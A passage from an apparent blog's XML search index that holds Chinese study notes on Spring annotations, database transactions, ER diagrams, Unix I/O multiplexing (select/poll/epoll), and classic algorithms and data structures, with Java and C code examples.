@SessionAttributes(value=&#123;"names"&#125;,types=&#123;Integer.class&#125;) public class ScopeService &#123; @RequestMapping("/testSession") public String test(Map&lt;String,Object&gt; map)&#123; map.put("names", Arrays.asList("a","b","c")); map.put("age", 12); return "hello"; &#125;&#125; @Required适用于bean属性setter方法，并表示受影响的bean属性必须在XML配置文件在配置时进行填充。否则，容器会抛出一个BeanInitializationException异常。 @Qualifier当你创建多个具有相同类型的 bean 时，并且想要用一个属性只为它们其中的一个进行装配，在这种情况下，你可以使用 @Qualifier 注释和 @Autowired 注释通过指定哪一个真正的 bean 将会被装配来消除混乱]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>注解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[事务隔离级别]]></title>
    <url>%2F2018%2F01%2F13%2F%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%2F</url>
    <content type="text"><![CDATA[为了解决多个事务并发引起的问题，进行并发控制。数据库系统提供了四种事务隔离级别供用户选择。 第一类丢失更新定义：A事务撤销时，把已经提交的B事务的更新数据覆盖了。 第二类丢失更新A事务提交时，把已经提交的B事务的更新数据覆盖了。 名称 内容 读未提交（Read Uncommitted） 不允许第一类更新丢失。允许脏读，不隔离事务。 读已提交（Read Committed） 不允许脏读，允许不可重复读。 可重复读（Repeatable Read） 不允许不可重复读。但可能出现幻读。 串行化（Serializable） 所有的增删改查串行执行。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>事务</tag>
        <tag>隔离级别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ER图]]></title>
    <url>%2F2018%2F01%2F11%2FER%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[本篇博客介绍ER图的相关内容 ER图的基本介绍E-R图也称实体-联系图(Entity Relationship Diagram)，提供了表示实体类型、属性和联系的方法，用来描述现实世界的概念模型。 符号 表示类型 矩形框 实体 椭圆图框 属性 菱形框 联系 用“矩形框”表示实体型，矩形框内写明实体名称；用“椭圆图框”表示实体的属性，并用“实心线段”将其与相应关系的“实体型”连接起来；用”菱形框“表示实体型之间的联系成因，在菱形框内写明联系名，并用”实心线段“分别与有关实体型连接起来，同时在”实心线段“旁标上联系的类型（1:1,1:n或m:n）。 绘制ER图question：设有商店和顾客两个实体，“商店”有属性：商店编号、商店名、地址、电话，“顾客”有属性：顾客编号、姓名、地址、年龄、性别。假设一个商店有多个顾客购物，一个顾客可以到多个商店购物，顾客每次去商店购物有一个消费金额和日期，而且规定每个顾客在每个商店里每天最多消费一次。 名称 内容 ER图 商店表 id，商店编号，商店名称，地址，电话 消费表 id，商店编号，顾客编号，消费金额，日期 顾客表 id，顾客编号，姓名，地址，年龄，性别]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库表设计规则</tag>
        <tag>ER图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DI]]></title>
    <url>%2F2018%2F01%2F11%2FDI%2F</url>
    <content type="text"><![CDATA[解释DI即依赖注入 IOC：也即控制反转，DI即依赖注入，控制反转IOC和依赖注入DI其实就是同个概念的两个不同角度的解释。]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>DI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOC]]></title>
    <url>%2F2018%2F01%2F11%2FIOC%2F</url>
    <content type="text"><![CDATA[解释IoC(Inversion of Control)控制反转，包含了两个方面：控制、反转。 控制指的是：当前对象对内部成员的控制权。 反转指的是：这种控制权不由当前对象管理了，由其他(类,第三方容器)来管理。 IOC容器Bean工厂，创建并管理bean。]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>IOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[事务并发一致性问题]]></title>
    <url>%2F2018%2F01%2F11%2F%E4%BA%8B%E5%8A%A1%E5%B9%B6%E5%8F%91%E4%B8%80%E8%87%B4%E6%80%A7%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。 丢失修改T1 和 T2 两个事务都对一个数据进行修改，T1 先修改，T2 随后修改，T2 的修改覆盖了 T1 的修改。 读脏数据T1 修改一个数据，T2 随后读取这个数据。如果 T1 撤销了这次修改，那么 T2 读取的数据是脏数据。 不可重复读T2 读取一个数据，T1 对该数据做了修改。如果 T2 再次读取这个数据，此时读取的结果和第一次读取的结果不同。 幻影读T1 读取某个范围的数据，T2 在这个范围内插入新的数据，T1 再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。 并发不一致性问题产生的原因产生并发不一致性问题主要原因是破坏了事务的隔离性，解决方法是通过并发控制来保证隔离性。并发控制可以通过封锁来实现，但是封锁操作需要用户自己控制，相当复杂。数据库管理系统提供了事务的隔离级别，让用户以一种更轻松的方式处理并发一致性问题。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>并发</tag>
        <tag>不可重复读</tag>
        <tag>幻读</tag>
        <tag>丢失修改</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Socket]]></title>
    <url>%2F2018%2F01%2F03%2FSocket%2F</url>
    <content type="text"><![CDATA[一、I/O 模型一个输入操作通常包括两个阶段： 等待数据准备好 从内核向进程复制数据 对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。 Unix 有五种 I/O 模型： 阻塞式 I/O 非阻塞式 I/O I/O 复用（select 和 poll） 信号驱动式 I/O（SIGIO） 异步 I/O（AIO） 阻塞式 I/O应用进程被阻塞，直到数据从内核缓冲区复制到应用进程缓冲区中才返回。 应该注意到，在阻塞的过程中，其它应用进程还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其它应用进程还可以执行，所以不消耗 CPU 时间，这种模型的 CPU 利用率效率会比较高。 下图中，recvfrom() 用于接收 Socket 传来的数据，并复制到应用进程的缓冲区 buf 中。这里把 recvfrom() 当成系统调用。 1ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen); 非阻塞式 I/O应用进程执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不断的执行系统调用来获知 I/O 是否完成，这种方式称为轮询（polling）。 由于 CPU 要处理更多的系统调用，因此这种模型的 CPU 利用率比较低。 I/O 复用使用 select 或者 poll 等待数据，并且可以等待多个套接字中的任何一个变为可读。这一过程会被阻塞，当某一个套接字可读时返回，之后再使用 recvfrom 把数据从内核复制到进程中。 它可以让单个进程具有处理多个 I/O 事件的能力。又被称为 Event Driven I/O，即事件驱动 I/O。 如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时有几万个连接，那么就需要创建相同数量的线程。相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。 信号驱动 I/O应用进程使用 sigaction 系统调用，内核立即返回，应用进程可以继续执行，也就是说等待数据阶段应用进程是非阻塞的。内核在数据到达时向应用进程发送 SIGIO 信号，应用进程收到之后在信号处理程序中调用 recvfrom 将数据从内核复制到应用进程中。 相比于非阻塞式 I/O 的轮询方式，信号驱动 I/O 的 CPU 利用率更高。 异步 I/O应用进程执行 aio_read 系统调用会立即返回，应用进程可以继续执行，不会被阻塞，内核会在所有操作完成之后向应用进程发送信号。 异步 I/O 与信号驱动 I/O 的区别在于，异步 I/O 的信号是通知应用进程 I/O 完成，而信号驱动 I/O 的信号是通知应用进程可以开始 I/O。 五大 I/O 模型比较 同步 I/O：将数据从内核缓冲区复制到应用进程缓冲区的阶段，应用进程会阻塞。 异步 I/O：不会阻塞。 阻塞式 I/O、非阻塞式 I/O、I/O 复用和信号驱动 I/O 都是同步 I/O，它们的主要区别在第一个阶段。 非阻塞式 I/O 、信号驱动 I/O 和异步 I/O 在第一阶段不会阻塞。 二、I/O 复用select/poll/epoll 都是 I/O 多路复用的具体实现，select 出现的最早，之后是 poll，再是 epoll。 select1int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); 有三种类型的描述符类型：readset、writeset、exceptset，分别对应读、写、异常条件的描述符集合。fd_set 使用数组实现，数组大小使用 FD_SETSIZE 定义。 timeout 为超时参数，调用 select 会一直阻塞直到有描述符的事件到达或者等待的时间超过 timeout。 成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0。 123456789101112131415161718192021222324252627282930313233343536fd_set fd_in, fd_out;struct timeval tv;// Reset the setsFD_ZERO( &amp;fd_in );FD_ZERO( &amp;fd_out );// Monitor sock1 for input eventsFD_SET( sock1, &amp;fd_in );// Monitor sock2 for output eventsFD_SET( sock2, &amp;fd_out );// Find out which socket has the largest numeric value as select requires itint largest_sock = sock1 &gt; sock2 ? sock1 : sock2;// Wait up to 10 secondstv.tv_sec = 10;tv.tv_usec = 0;// Call the selectint ret = select( largest_sock + 1, &amp;fd_in, &amp;fd_out, NULL, &amp;tv );// Check if select actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; if ( FD_ISSET( sock1, &amp;fd_in ) ) // input event on sock1 if ( FD_ISSET( sock2, &amp;fd_out ) ) // output event on sock2&#125; poll1int poll(struct pollfd *fds, unsigned int nfds, int timeout); pollfd 使用链表实现。 1234567891011121314151617181920212223242526272829// The structure for two eventsstruct pollfd fds[2];// Monitor sock1 for inputfds[0].fd = sock1;fds[0].events = POLLIN;// Monitor sock2 for outputfds[1].fd = sock2;fds[1].events = POLLOUT;// Wait 10 secondsint ret = poll( &amp;fds, 2, 10000 );// Check if poll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // If we detect the event, zero it out so we can reuse the structure if ( fds[0].revents &amp; POLLIN ) fds[0].revents = 0; // input event on sock1 if ( fds[1].revents &amp; POLLOUT ) fds[1].revents = 0; // output event on sock2&#125; 比较1. 功能select 和 poll 的功能基本相同，不过在一些实现细节上有所不同。 select 会修改描述符，而 poll 不会； select 的描述符类型使用数组实现，FD_SETSIZE 大小默认为 1024，因此默认只能监听 1024 个描述符。如果要监听更多描述符的话，需要修改 FD_SETSIZE 之后重新编译；而 poll 的描述符类型使用链表实现，没有描述符数量的限制； poll 提供了更多的事件类型，并且对描述符的重复利用上比 select 高。 如果一个线程对某个描述符调用了 select 或者 poll，另一个线程关闭了该描述符，会导致调用结果不确定。 2. 速度select 和 poll 速度都比较慢。 select 和 poll 每次调用都需要将全部描述符从应用进程缓冲区复制到内核缓冲区。 select 和 poll 的返回结果中没有声明哪些描述符已经准备好，所以如果返回值大于 0 时，应用进程都需要使用轮询的方式来找到 I/O 完成的描述符。 3. 可移植性几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。 epoll123int epoll_create(int size);int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout); epoll_ctl() 用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理，进程调用 epoll_wait() 便可以得到事件完成的描述符。 从上面的描述可以看出，epoll 只需要将描述符从进程缓冲区向内核缓冲区拷贝一次，并且进程不需要通过轮询来获得事件完成的描述符。 epoll 仅适用于 Linux OS。 epoll 比 select 和 poll 更加灵活而且没有描述符数量限制。 epoll 对多线程编程更有友好，一个线程调用了 epoll_wait() 另一个线程关闭了同一个描述符也不会产生像 select 和 poll 的不确定情况。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.// The function argument is ignored (it was not before, but now it is), so put your favorite number hereint pollingfd = epoll_create( 0xCAFE );if ( pollingfd &lt; 0 ) // report error// Initialize the epoll structure in case more members are added in futurestruct epoll_event ev = &#123; 0 &#125;;// Associate the connection class instance with the event. You can associate anything// you want, epoll does not use this information. We store a connection class pointer, pConnection1ev.data.ptr = pConnection1;// Monitor for input, and do not automatically rearm the descriptor after the eventev.events = EPOLLIN | EPOLLONESHOT;// Add the descriptor into the monitoring list. We can do it even if another thread is// waiting in epoll_wait - the descriptor will be properly addedif ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1-&gt;getSocket(), &amp;ev ) != 0 ) // report error// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)struct epoll_event pevents[ 20 ];// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event arrayint ready = epoll_wait( pollingfd, pevents, 20, 10000 );// Check if epoll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // Check if any events detected for ( int i = 0; i &lt; ret; i++ ) &#123; if ( pevents[i].events &amp; EPOLLIN ) &#123; // Get back our connection pointer Connection * c = (Connection*) pevents[i].data.ptr; c-&gt;handleReadEvent(); &#125; &#125;&#125; 工作模式epoll 的描述符事件有两种触发模式：LT（level trigger）和 ET（edge trigger）。 1. LT 模式当 epoll_wait() 检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用 epoll_wait() 会再次通知进程。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。 2. ET 模式和 LT 模式不同的是，通知之后进程必须立即处理事件，下次再调用 epoll_wait() 时不会再得到事件到达的通知。 很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。 应用场景很容易产生一种错觉认为只要用 epoll 就可以了，select 和 poll 都已经过时了，其实它们都有各自的使用场景。 1. select 应用场景select 的 timeout 参数精度为 1ns，而 poll 和 epoll 为 1ms，因此 select 更加适用于实时性要求比较高的场景，比如核反应堆的控制。 select 可移植性更好，几乎被所有主流平台所支持。 2. poll 应用场景poll 没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用 poll 而不是 select。 3. epoll 应用场景只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。 需要同时监控小于 1000 个描述符，就没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。 需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用 epoll。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。并且 epoll 的描述符存储在内核，不容易调试。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>Socket</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分治算法]]></title>
    <url>%2F2017%2F12%2F25%2F%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[基本概念在计算机科学中，分治法是一种很重要的算法。字面上的解释是“分而治之”，就是把一个复杂的问题分成两个或更多的相同或相似的子问题，再把子问题分成更小的子问题……直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并。 基本思想及策略分治法的设计思想是：将一个难以直接解决的大问题，分割成一些规模较小的相同问题，以便各个击破，分而治之。 分治策略是：对于一个规模为n的问题，若该问题可以容易地解决（比如说规模n较小）则直接解决，否则将其分解为k个规模较小的子问题，这些子问题互相独立且与原问题形式相同，递归地解这些子问题，然后将各子问题的解合并得到原问题的解。这种算法设计策略叫做分治法。 用分治法设计程序时的思维过程 一定是先找到最小问题规模时的求解方法 然后考虑随着问题规模增大时的求解方法 找到求解的递归函数式后（各种规模或因子），设计递归程序即可。 例题：合并K个排序链表 合并 k 个排序链表，返回合并后的排序链表。请分析和描述算法的复杂度。 示例: 1234567输入:[ 1-&gt;4-&gt;5, 1-&gt;3-&gt;4, 2-&gt;6]输出: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6 解决方案: 12345678910111213141516171819202122232425262728293031323334353637383940class Solution &#123; public ListNode mergeKLists(ListNode[] lists)&#123; if(lists.length == 0) return null; if(lists.length == 1) return lists[0]; if(lists.length == 2)&#123; return mergeTwoLists(lists[0],lists[1]); &#125; int mid = lists.length/2; ListNode[] l1 = new ListNode[mid]; for(int i = 0; i &lt; mid; i++)&#123; l1[i] = lists[i]; &#125; ListNode[] l2 = new ListNode[lists.length-mid]; for(int i = mid,j=0; i &lt; lists.length; i++,j++)&#123; l2[j] = lists[i]; &#125; return mergeTwoLists(mergeKLists(l1),mergeKLists(l2)); &#125; public ListNode mergeTwoLists(ListNode l1, ListNode l2) &#123; if (l1 == null) return l2; if (l2 == null) return l1; ListNode head = null; if (l1.val &lt;= l2.val)&#123; head = l1; head.next = mergeTwoLists(l1.next, l2); &#125; else &#123; head = l2; head.next = mergeTwoLists(l1, l2.next); &#125; return head; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>分治算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态规划]]></title>
    <url>%2F2017%2F12%2F23%2F%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%2F</url>
    <content type="text"><![CDATA[基本概念动态规划过程是：每次决策依赖于当前状态，又随即引起状态的转移。一个决策序列就是在变化的状态中产生出来的，所以，这种多阶段最优化决策解决问题的过程就称为动态规划。 基本思想与策略基本思想与分治法类似，也是将待求解的问题分解为若干个子问题（阶段），按顺序求解子阶段，前一子问题的解，为后一子问题的求解提供了有用的信息。在求解任一子问题时，列出各种可能的局部解，通过决策保留那些有可能达到最优的局部解，丢弃其他局部解。依次解决各子问题，最后一个子问题就是初始问题的解。 适用的情况能采用动态规划求解的问题的一般要具有3个性质： ​ (1) 最优化原理：如果问题的最优解所包含的子问题的解也是最优的，就称该问题具有最优子结构，即满足最优化原理。 ​ (2) 无后效性：即某阶段状态一旦确定，就不受这个状态以后决策的影响。也就是说，某状态以后的过程不会影响以前的状态，只与当前状态有关。 （3）有重叠子问题：即子问题之间是不独立的，一个子问题在下一阶段决策中可能被多次使用到。（该性质并不是动态规划适用的必要条件，但是如果没有这条性质，动态规划算法同其他算法相比就不具备优势） 求解的基本步骤（1）划分阶段 （2）确定状态和状态变量 （3）确定决策并写出状态转移方程 （4）寻找边界条件 算法实现的说明 动态规划的主要难点在于理论上的设计，也就是上面4个步骤的确定，一旦设计完成，实现部分就会非常简单。 ​ 使用动态规划求解问题，最重要的就是确定动态规划三要素： （1）问题的阶段 （2）每个阶段的状态 （3）从前一个阶段转化到后一个阶段之间的递推关系。 例题:最大子序和给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。 示例: 123输入: [-2,1,-3,4,-1,2,1,-5,4],输出: 6解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。 解决方案: 12345678910class Solution &#123; public int maxSubArray(int[] nums) &#123; int ans = nums[0], sum = nums[0]; for(int i = 1; i &lt; nums.length; i++)&#123; sum = Math.max(nums[i], sum + nums[i]); ans = Math.max(ans, sum); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[回溯算法]]></title>
    <url>%2F2017%2F12%2F23%2F%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[基本概念 回溯算法实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已不满足求解条件时，就“回溯”返回，尝试别的路径。 回溯法是一种选优搜索法，按选优条件向前搜索，以达到目标。 但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。 许多复杂的，规模较大的问题都可以使用回溯法，有“通用解题方法”的美称。 例题：全排列给定一个没有重复数字的序列，返回其所有可能的全排列。 示例: 12345678910输入: [1,2,3]输出:[ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1]] 解决方案: 123456789101112131415161718192021222324class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; permute(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;(); ArrayList list = new ArrayList&lt;Integer&gt;(); permute(res,list,nums,0); return res;&#125;public void permute(List&lt;List&lt;Integer&gt;&gt; res,ArrayList&lt;Integer&gt; list,int []nums,int index) &#123; if(index == nums.length)&#123; ArrayList perList = new ArrayList&lt;&gt;(); perList.addAll(list); res.add(perList); return; &#125;else&#123; for(int i = 0;i &lt; nums.length;i++)&#123; if(!list.contains(nums[i]))&#123; list.add(nums[i]); permute(res,list,nums,index+1); list.remove(list.size() - 1); &#125; &#125; &#125;&#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>回溯法</tag>
        <tag>递归</tag>
        <tag>搜索</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二分查找]]></title>
    <url>%2F2017%2F12%2F13%2F%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%2F</url>
    <content type="text"><![CDATA[Java实现二分查找算法二分查找（binary search），也称折半搜索，是一种在 有序数组 中 查找某一特定元素 的搜索算法。搜索过程从数组的中间元素开始，如果中间元素正好是要查找的元素，则搜索过程结束；如果某一特定元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半中查找，而且跟开始一样从中间元素开始比较。如果在某一步骤数组为空，则代表找不到。这种搜索算法每一次比较都使搜索范围缩小一半。 123456789int binarysearch(int array[], int low, int high, int target) &#123; if (low &gt; high) return -1; int mid = low + (high - low) / 2; if (array[mid] &gt; target) return binarysearch(array, low, mid - 1, target); if (array[mid] &lt; target) return binarysearch(array, mid + 1, high, target); return mid;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[哈希表]]></title>
    <url>%2F2017%2F11%2F27%2F%E5%93%88%E5%B8%8C%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[使用哈希表可以进行非常快速的查找操作。 哈希是什么？ 散列（hashing）是电脑科学中一种对资料的处理方法，通过某种特定的函数/算法（称为散列函数/算法）将要检索的项与用来检索的索引（称为散列，或者散列值）关联起来，生成一种便于搜索的数据结构（称为散列表）。也译为散列。旧译哈希（误以为是人名而采用了音译）。它也常用作一种资讯安全的实作方法，由一串资料中经过散列算法（Hashing algorithms）计算出来的资料指纹（data fingerprint），经常用来识别档案与资料是否有被窜改，以保证档案与资料确实是由原创者所提供。 —维基百科 哈希函数所有的哈希函数都具有如下一个基本特性：如果两个散列值是不相同的（根据同一函数），那么这两个散列值的原始输入也是不相同的。这个特性是散列函数具有确定性的结果，具有这种性质的散列函数称为单向散列函数。 哈希表 名称 内容 散列表 若关键字为k，则其值存放在f(k)的存储位置上。由此，不需比较便可直接取得所查记录。称这个对应关系f为散列函数，按这个思想建立的表为散列表。 散列地址 对不同的关键字可能得到同一散列地址，即k1≠k2，而f(k1)=f(k2)，这种现象称为冲突。具有相同函数值的关键字对该散列函数来说称做同义词。综上所述，根据散列函数f(k)和处理冲突的方法将一组关键字映射到一个有限的连续的地址集（区间）上，并以关键字在地址集中的“像”作为记录在表中的存储位置，这种表便称为散列表，这一映射过程称为散列造表或散列，所得的存储位置称散列地址。 散列函数 若对于关键字集合中的任一个关键字，经散列函数映象到地址集合中任何一个地址的概率是相等的，则称此类散列函数为均匀散列函数（Uniform Hash function），这就是使关键字经过散列函数得到一个“随机的地址”，从而减少冲突。 处理冲突若两个键经hash函数处理得到相同的结果，则称此种情况为出现了冲突。冲突的解决有以下几种方法。 开放定址法 单独链表法 双散列 再散列 建立一个公共溢出区 介绍一下java中使用的一种处理冲突的方法单独链表法：将散列到同一个存储位置的所有元素保存在一个链表中。实现时，一种策略是散列表同一位置的所有冲突结果都是用栈存放的，新元素被插入到表的前端还是后端完全取决于怎样方便。 查找效率 散列表的查找过程基本上和造表过程相同。 一些关键码可通过散列函数转换的地址直接找到，另一些关键码在散列函数得到的地址上产生了冲突，需要按处理冲突的方法进行查找。 在介绍的三种处理冲突的方法中，产生冲突后的查找仍然是给定值与关键码进行比较的过程，所以，对散列表查找效率的量度，依然用平均查找长度来衡量。 查找过程中，关键码的比较次数，取决于产生冲突的多少，产生的冲突少，查找效率就高，产生的冲突多，查找效率就低。 影响产生冲突多少的因素，也就是影响查找效率的因素。 影响产生冲突多少有以下三个因素： 散列函数是否均匀； 处理冲突的方法； 散列表的载荷因子（英语：load factor）。 载荷因子 散列表的载荷因子定义为：α= 填入表中的元素个数 / 散列表的长度 α是散列表装满程度的标志因子。 由于表长是定值，α与“填入表中的元素个数”成正比，所以，α越大，表明填入表中的元素越多，产生冲突的可能性就越大；反之，α越小，表明填入表中的元素越少，产生冲突的可能性就越小。 实际上，散列表的平均查找长度是载荷因子α的函数，只是不同处理冲突的方法有不同的函数。 对于开放定址法，荷载因子是特别重要因素，超过0.8，查表时的CPU缓存不命中（cache missing）按照指数曲线上升。因此，一些采用开放定址法的hash库，如Java的系统库限制了荷载因子为0.75，超过此值将resize散列表。]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>冲突处理</tag>
        <tag>哈希</tag>
        <tag>散列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[枚举法]]></title>
    <url>%2F2017%2F11%2F25%2F%E6%9E%9A%E4%B8%BE%E6%B3%95%2F</url>
    <content type="text"><![CDATA[基本思想 枚举也称作穷举，指的是从问题所有可能的解的集合中一一枚举各元素。 用题目中给定的检验条件判定哪些是无用的，哪些是有用的。能使命题成立。即为其解。 例题：最长公共连续子串 牛牛有两个字符串（可能包含空格）,牛牛想找出其中最长的公共连续子串,希望你能帮助他,并输出其长度。 输入描述:1输入为两行字符串（可能包含空格），长度均小于等于50. 输出描述:1输出为一个整数，表示最长公共连续子串的长度。 解决方案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import java.util.Scanner; public class Main&#123; public static void main(String[] args) &#123; Scanner scanner = new Scanner(System.in); String str1 = scanner.nextLine(); String str2 = scanner.nextLine(); scanner.close(); //字符串的长度 int n1 = str1.length(); int n2 = str2.length(); //边界情况 if(n1 &lt; 1 || n2 &lt; 1) &#123; System.out.println(0); return; &#125; //利用空间存储两个串的比较结果，空间换时间 int temp[][] = new int[n1][n2]; //表示最长的公共字串的变量 int longest = 0; char[] char1 = str1.toCharArray(); char[] char2 = str2.toCharArray(); //初始化数组temp for(int i = 0; i &lt; n1; i++) &#123; for(int j = 0;j &lt;n2;j++) &#123; temp[i][j] = 0; &#125; &#125; //初始化第一行，初始化第一列，因为状态转移公式：item[i][j]=1 +item[i-1][j-1] for(int i = 0;i &lt; n1;i++) &#123; if(char1[i] == char2[0]) temp[i][0] = 1; &#125; for(int i = 0;i &lt; n2;i++) &#123; if(char1[0] == char2[i]) temp[0][i] = 1; &#125; //利用状态转移方程进行填充temp二维数组 for(int i = 1; i &lt; n1;i++) &#123; for(int j = 1; j&lt;n2;j++) &#123; if (char1[i] == char2[j]) &#123; temp[i][j] = temp[i-1][j-1] +1; &#125; &#125; &#125; for(int i = 0; i &lt; n1;i++) &#123; for(int j = 0; j&lt;n2;j++) &#123; if(temp[i][j] &gt; longest) longest = temp[i][j]; &#125; &#125; System.out.println(longest); &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>枚举法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二叉搜索树]]></title>
    <url>%2F2017%2F11%2F23%2F%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%2F</url>
    <content type="text"><![CDATA[基本概念二叉搜索树(BST)又叫二叉查找树，二叉排序树。二叉搜索树就是一棵二叉树，但是它又具有搜索树的特征： 每个结点都比它的左结点大，比右结点小。 每个结点的左右子树都是一课二叉搜索树。 对一棵二叉搜索树进行中序遍历结果是从小到大排序的结果。 代码实现123456789101112131415161718192021/**结点数据结构*/ static class BinaryNode&lt;T&gt; &#123; T data; BinaryNode&lt;T&gt; left; BinaryNode&lt;T&gt; right; public BinaryNode(T data) &#123; this(data,null,null); &#125; public BinaryNode( T data, BinaryNode&lt;T&gt; left, BinaryNode&lt;T&gt; right) &#123; this.data =data; this.left = left; this.right =right; &#125; public BinaryNode() &#123; data =null; this.left = left; this.right =right; &#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/**查找指定的元素,默认从 * 根结点出开始查询*/ public boolean contains(T t) &#123; return contains(t, rootTree); &#125; /**从某个结点出开始查找元素*/ public boolean contains(T t, BinaryNode&lt;T&gt; node) &#123; if(node==null) return false;//结点为空，查找失败 int result = t.compareTo(node.data); if(result&gt;0) return contains(t,node.right);//递归查询右子树 else if(result&lt;0) return contains(t, node.left);//递归查询左子树 else return true; &#125; /** 这里我提供一个对二叉树最大值 最小值的搜索*/ /**找到二叉查找树中的最小值*/ public T findMin() &#123; if(isEmpty()) &#123; System.out.println("二叉树为空"); return null; &#125;else return findMin(rootTree).data; &#125; /**找到二叉查找树中的最大值*/ public T findMax() &#123; if(isEmpty()) &#123; System.out.println("二叉树为空"); return null; &#125;else return findMax(rootTree).data; &#125; /**查询出最小元素所在的结点*/ public BinaryNode&lt;T&gt; findMin(BinaryNode&lt;T&gt; node) &#123; if(node==null) return null; else if(node.left==null) return node; return findMin(node.left);//递归查找 &#125; /**查询出最大元素所在的结点*/ public BinaryNode&lt;T&gt; findMax(BinaryNode&lt;T&gt; node) &#123; if(node!=null) &#123; while(node.right!=null) node=node.right; &#125; return node; &#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
